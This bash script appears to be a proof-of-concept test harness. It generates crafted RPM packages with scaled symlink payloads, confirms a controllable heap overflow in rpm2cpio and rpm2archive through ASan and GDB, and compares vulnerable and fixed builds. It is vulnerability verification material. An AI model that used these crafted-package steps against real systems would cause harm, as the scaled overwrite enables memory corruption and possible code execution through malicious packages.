#!/usr/bin/env bash
# Measure that the real rpmcpioRead() copy length follows the crafted newc
# symlink data field, not the 64-byte size used by the original fixture.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
vuln_config=$(cd "$root/install-vuln/lib/rpm" && pwd)
fixed_config=$(cd "$root/build-fixed-asan" && pwd)
sizes=(64 512 4096)

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }

mkdir -p scaled

for n in "${sizes[@]}"; do
    RPM2SHELL_PAYLOAD_LEN=$n python3 make-attack.py safe.rpm \
        "scaled/attack-$n.rpm" > "scaled/make-$n.log" || {
        bad "generate attack-$n.rpm"; cat "scaled/make-$n.log"; continue; }
    if grep -q "chosen_payload_bytes=$n" "scaled/make-$n.log"; then
        ok "generate attack-$n.rpm chosen bytes"
    else
        bad "generate attack-$n.rpm chosen bytes"
    fi
done

asan_case() {
    local name=$1 expected=$2 config=$3 binary=$4 package=$5
    local log="scaled/$name.log" rc
    env RPM_CONFIGDIR="$config" \
        ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
        "$binary" "$package" >/dev/null 2>"$log"
    rc=$?
    printf '%s\n' "$rc" > "$log.rc"
    if [ "$rc" -eq "$expected" ]; then
        ok "$name rc=$rc"
    else
        bad "$name rc=$rc expected=$expected"
    fi
}

for n in "${sizes[@]}"; do
    asan_case "asan-rpm2cpio-$n" 134 "$vuln_config" \
        "$root/build-vuln-asan/tools/rpm2cpio" "scaled/attack-$n.rpm"
    log="scaled/asan-rpm2cpio-$n.log"
    if grep -q "WRITE of size $n" "$log" && \
       grep -q '0 bytes after 1-byte region' "$log" && \
       grep -q 'iterReadArchiveNext.*rpmfi.cc:2242' "$log"; then
        ok "$log real ASan write of size $n"
    else
        bad "$log real ASan write of size $n"
    fi

    # Plain build: the larger overwrite does not by itself fault rpm2cpio.
    env RPM_CONFIGDIR="$vuln_config" \
        "$root/build-vuln-plain/tools/rpm2cpio" "scaled/attack-$n.rpm" \
        >/dev/null 2>"scaled/plain-rpm2cpio-$n.log"
    rc=$?
    printf '%s\n' "$rc" > "scaled/plain-rpm2cpio-$n.log.rc"
    if [ "$rc" -eq 1 ]; then
        ok "plain rpm2cpio n=$n exits 1 without fault"
    else
        bad "plain rpm2cpio n=$n rc=$rc expected 1"
    fi
done

for n in 64 4096; do
    asan_case "asan-rpm2archive-$n" 134 "$vuln_config" \
        "$root/build-vuln-asan/tools/rpm2archive" "scaled/attack-$n.rpm"
    if grep -q "WRITE of size $n" "scaled/asan-rpm2archive-$n.log"; then
        ok "rpm2archive n=$n real ASan write"
    else
        bad "rpm2archive n=$n real ASan write"
    fi
done

asan_case fixed-rpm2archive-4096 1 "$fixed_config" \
    "$root/build-fixed-asan/tools/rpm2archive" scaled/attack-4096.rpm
asan_case vuln-rpm2archive-safe 0 "$vuln_config" \
    "$root/build-vuln-asan/tools/rpm2archive" safe-newc.rpm
for log in scaled/fixed-rpm2archive-4096.log scaled/vuln-rpm2archive-safe.log; do
    if grep -q AddressSanitizer "$log"; then
        bad "$log unexpected ASan report"
    else
        ok "$log ASan-clean"
    fi
done

# Plain GDB readback: chosen bytes really reach the far end of the copy.
env RPM_CONFIGDIR="$vuln_config" gdb -q -batch -x scaled/readback-4096.gdb \
    "$root/build-vuln-plain/tools/rpm2cpio" > scaled/gdb-readback-4096.log 2>&1
if grep -q 'SCALED_BUF=.*LSIZE=-1' scaled/gdb-readback-4096.log && \
   grep -q "MISHE-RPM!!" scaled/gdb-readback-4096.log && \
   grep -q '0x4141414141414141' scaled/gdb-readback-4096.log; then
    ok "GDB chosen bytes at buf+4088"
else
    bad "GDB chosen bytes at buf+4088"
    cat scaled/gdb-readback-4096.log
fi

echo "SCALED_PAYLOAD_PASS=$pass SCALED_PAYLOAD_FAIL=$fail"
[ "$fail" -eq 0 ]
